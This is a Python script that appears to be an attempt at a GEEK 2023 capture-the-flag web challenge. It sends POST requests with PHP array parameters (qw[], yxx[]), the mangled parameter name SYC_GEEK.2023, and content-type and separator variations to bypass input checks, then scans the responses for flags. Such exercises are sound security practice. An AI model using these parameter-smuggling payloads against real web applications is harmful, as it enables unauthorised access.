import urllib.request, re, html

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'
base = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'

def try_body(label, body, ct='application/x-www-form-urlencoded'):
    req = urllib.request.Request(base, data=body, headers={
        'User-Agent': 'Mozilla/5.0', 'Content-Type': ct})
    resp = urllib.request.urlopen(req, timeout=10)
    text = html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    idx = text.find('?>')
    text = text[idx+2:].strip() if idx > 0 else ''
    for pat in ['Geesec{', 'flag{', 'CTF{', 'ISCC{', 'GEEK{']:
        if pat in text:
            i = text.find(pat); e = text.find('}', i)
            if e > i: print(f"FLAG: {text[i:e+1]} ({label})"); return True
    print(f"[{label}] -> {text.replace(chr(0xa0),' ')[:60]}")
    return False

# Trick 1: content-type without charset
try_body('no charset', b'qw[]=a&yxx[]=b&SYC_GEEK.2023=Happy to see you!',
         'application/x-www-form-urlencoded')

# Trick 2: use text/plain  
try_body('text/plain', b'qw[]=a&yxx[]=b&SYC_GEEK.2023=Happy to see you!',
         'text/plain')

# Trick 3: application/x-www-form-urlencoded without ;charset
try_body('no charset2', b'qw[]=a&yxx[]=b&SYC_GEEK.2023=Happy to see you!',
         'application/x-www-form-urlencoded; charset=')

# Trick 4: use the exact parameter value including & for next param
try_body('exact', b'qw=a&yxx=b&SYC_GEEK.2023=Happy to see you!')

# Trick 5: use ; as separator instead of &
try_body('semicolon', b'qw[]=a;yxx[]=b;SYC_GEEK.2023=Happy to see you!')

# Trick 6: send the flag.php output - check if include_once leaks
# Actually, let me check if flag is in response somehow
req = urllib.request.Request(base, data=b'qw[]=a&yxx[]=b&SYC_GEEK.2023=1', headers={
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded'
})
resp = urllib.request.urlopen(req, timeout=10)
text = html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
print(f"\nFull body length: {len(text)}")
# Check for flag in entire body
for pat in ['Geesec{', 'flag{', 'CTF{', 'ISCC{', 'GEEK{']:
    if pat in text:
        i = text.find(pat); e = text.find('}', i)
        if e > i: print(f"FLAG IN SOURCE: {text[i:e+1]}")
